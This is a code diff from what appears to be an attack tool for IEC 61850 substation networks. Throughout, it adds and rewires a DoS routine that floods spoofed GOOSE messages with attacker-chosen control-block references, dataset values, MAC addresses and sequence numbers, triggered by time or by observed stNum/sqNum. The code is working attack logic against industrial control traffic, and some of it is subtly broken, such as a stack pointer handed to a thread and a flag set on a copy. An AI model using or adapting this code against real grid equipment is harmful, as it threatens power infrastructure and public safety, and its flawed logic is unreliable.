@@ -23,9 +23,10 @@ static IedServer iedServer = NULL;
 
 bool enableInsertAttack=false;
 bool enableModifyAttack=false;
-bool enableDoSAttack=true ;
+bool enableDosAttack=true ;
 int executedInsertAttackCount=0;
 int executedModifyAttackCount=0;
+int executedDosAttackCount=0;
 struct AttackList attackList;
 clock_t beginTime;
 
@@ -36,7 +37,7 @@ int main(int argc, char **argv) {
 	double nextUpdatePayloadTime;
 	int port;
 	char *folder;
-	pthread_t tid_1;
+
 
 	//parameters for insert attack
 
@@ -139,15 +140,13 @@ int main(int argc, char **argv) {
 			}
 
 			//launch DoS attack
-			if(enableDoSAttack){
+			if(enableDosAttack){
 
-				//printf("This is a DOS attack\n");
-				//launchDoSAttack();
-				pthread_create(&tid_1, NULL, launchDoSAttack, (void *)10); //10 is the number of packets
-			    pthread_join(tid_1, NULL);
-			    printf("Thread ended! DoS attack completed! \n");
-			    enableDoSAttack = false;
-
+				launchDoSAttack(iedServer);
+				//pthread_create(&tid_1, NULL, launchDoSAttackTEMP, (void *)10); //10 is the number of packets
+			    //pthread_join(tid_1, NULL);
+			    //printf("DoS attack completed! \n");
+			    //enableDoSAttack = false;
 			}
 
 
@@ -360,28 +359,124 @@ void insertPacket(struct InsertAttack iAttack) {
 	LinkedList_destroyDeep(dataSetValues,(LinkedListValueDeleteFunction) MmsValue_delete);
 
 }
+void launchDoSAttack(IedServer iedserver) {//todo rewrite
+	LinkedList element = iedserver->mmsMapping->gseControls;
+	while ((element = LinkedList_getNext(element)) != NULL) {
+		MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
+		GoosePublisher publisher = gcb->publisher;
+		int index = 0;
+		struct DosAttack currentAttack;
+		while (attackList.dosAttackList[index].valid) {
+			currentAttack = attackList.dosAttackList[index];
+			if (!currentAttack.executed) {
+				if (currentAttack.condition_type == CONDITION_ST_SQ_GCB) {
+					if (GoosePublisher_getStNum(publisher)== currentAttack.condition_st
+							&& GoosePublisher_getSqNum(publisher)== currentAttack.condition_sq
+							&& !strcmp(gcb->name, currentAttack.condition_gcb)) {
+						createDoSAttackThread(currentAttack);
+						currentAttack.executed = true;
+						executedDosAttackCount++;
+					}
+				} else if (currentAttack.condition_type == CONDITION_TIME) {
+					if (getRuningTime() > currentAttack.condition_time) {
+						createDoSAttackThread(currentAttack);
+						currentAttack.executed = true;
+						executedDosAttackCount++;
+					}
+				}
+			}
+			if(attackList.dosAttackNum==executedDosAttackCount){
+				enableDosAttack=false;
+			}
 
+			index++;
 
-void *launchDoSAttack(void *packets) {
-	int num_packets;
-	num_packets = (int)packets;
-	// init varaiables
-	LinkedList DoS_dataSetValues = LinkedList_create();
-	GoosePublisher DoS_publisher;
-
-	insertDoSPacket(num_packets, &DoS_dataSetValues, &DoS_publisher); //1000 is the number of packets that I want to insert
-
-	LinkedList_destroyDeep(DoS_dataSetValues,
-			(LinkedListValueDeleteFunction) MmsValue_delete);
-	GoosePublisher_destroy(DoS_publisher);
-	printf("stop DoS thread\n");
-	pthread_exit(0);
-
-	//printf("Breakpoint 1 completed!");
-
+		}
+	}
+}
+void createDoSAttackThread(struct DosAttack dAttack){
+	pthread_t tid_1;
+	pthread_create(&tid_1, NULL, sendDosAttackPacket, (void *)&dAttack); //10 is the number of packets
+	pthread_join(tid_1, NULL);
+	//printf("DoS attack completed! \n");
 }
 
-void insertDoSPacket(int num_of_packets, LinkedList* dataSetValues, GoosePublisher* publisher) {
+void* sendDosAttackPacket(void *dAttack) {
+	struct DosAttack *attackPointer = (struct DosAttack*) dAttack;
+	struct DosAttack attack=*attackPointer;
+	char *interface = "lo";
+
+	LinkedList dataSetValues = LinkedList_create();
+	int valueIndex = 0;
+	while (strlen(attack.values[valueIndex].value) != 0) {
+		struct DosAttackValue currentValue = attack.values[valueIndex++];
+		if (!strcmp(currentValue.type, "integer")) {
+			LinkedList_add(dataSetValues,
+					MmsValue_newIntegerFromInt32(atoi(currentValue.value)));
+		} else if (!strcmp(currentValue.type, "string")) {
+			LinkedList_add(dataSetValues,
+					MmsValue_newVisibleString(currentValue.value));
+		} else if (!strcmp(currentValue.type, "boolean")) {
+			bool binValue = false;
+			if (!strcmp(currentValue.value, "true")) {
+				binValue = true;
+			}
+			LinkedList_add(dataSetValues, MmsValue_newBoolean(binValue));//todo double check why use binary time???
+
+		} else if (!strcmp(currentValue.type, "float")) {
+			LinkedList_add(dataSetValues,
+					MmsValue_newFloat(atof(currentValue.value)));
+		}
+	}
+
+	CommParameters gooseCommParameters;
+
+	gooseCommParameters.appId = attack.appId;
+	gooseCommParameters.dstAddress[0] = getHexFromString(0, attack.dstAddress);
+	gooseCommParameters.dstAddress[1] = getHexFromString(2, attack.dstAddress);
+	gooseCommParameters.dstAddress[2] = getHexFromString(4, attack.dstAddress);
+	gooseCommParameters.dstAddress[3] = getHexFromString(6, attack.dstAddress);
+	gooseCommParameters.dstAddress[4] = getHexFromString(8, attack.dstAddress);
+	gooseCommParameters.dstAddress[5] = getHexFromString(10,attack.dstAddress);
+	gooseCommParameters.vlanId = attack.vlanId;
+	gooseCommParameters.vlanPriority = attack.vlanPriority;
+	;
+
+	/*
+	 * Create a new GOOSE publisher instance. As the second parameter the interface
+	 * name can be provided (e.g. "eth0" on a Linux system). If the second parameter
+	 * is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
+	 * stack_config.h is used.
+	 */
+	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters,
+			interface);
+	//set st & sq number.
+	//publisher->stNum=iAttack.stNum;
+	//publisher->sqNum=iAttack.sqNum;
+	GoosePublisher_setStNum(publisher, attack.stNum);
+	GoosePublisher_setSqNum(publisher, attack.sqNum);
+
+	GoosePublisher_setGoCbRef(publisher, attack.gocbRef);//"liyuanTest/LLN0$GO$gcbAnalogValues"
+	GoosePublisher_setConfRev(publisher, 1);
+	GoosePublisher_setDataSetRef(publisher, attack.dataSet);//"liyuanTest/LLN0$AnalogValues"
+
+	int j;
+	for(j=0;j<attack.stopCondition_packetNum;j++){
+		if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
+				printf("Error sending message!\n");
+		}
+
+	}
+
+	GoosePublisher_destroy(publisher);
+
+	LinkedList_destroyDeep(dataSetValues,
+			(LinkedListValueDeleteFunction) MmsValue_delete);
+	printf("stop DoS thread\n");
+	pthread_exit(0);
+}
+
+/*void insertDoSPacket(int num_of_packets, LinkedList* dataSetValues, GoosePublisher* publisher) {
 
 	printf("inserting a DoS packet\n");
 	char *interface = "lo";
@@ -403,12 +498,6 @@ void insertDoSPacket(int num_of_packets, LinkedList* dataSetValues, GoosePublish
 	gooseCommParameters.vlanId = 0;
 	gooseCommParameters.vlanPriority = 4;
 
-	/*
-	 * Create a new GOOSE publisher instance. As the second parameter the interface
-	 * name can be provided (e.g. "eth0" on a Linux system). If the second parameter
-	 * is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
-	 * stack_config.h is used.
-	 */
 	*publisher = GoosePublisher_create(&gooseCommParameters,
 			interface);
 
@@ -423,7 +512,7 @@ void insertDoSPacket(int num_of_packets, LinkedList* dataSetValues, GoosePublish
 		num_of_packets = num_of_packets-1;
 	  }
 
-}
+}*/
 void launchModifyAttack(IedServer iedserver,char** array){
 	LinkedList element = iedserver->mmsMapping->gseControls;
 	while ((element = LinkedList_getNext(element)) != NULL) {
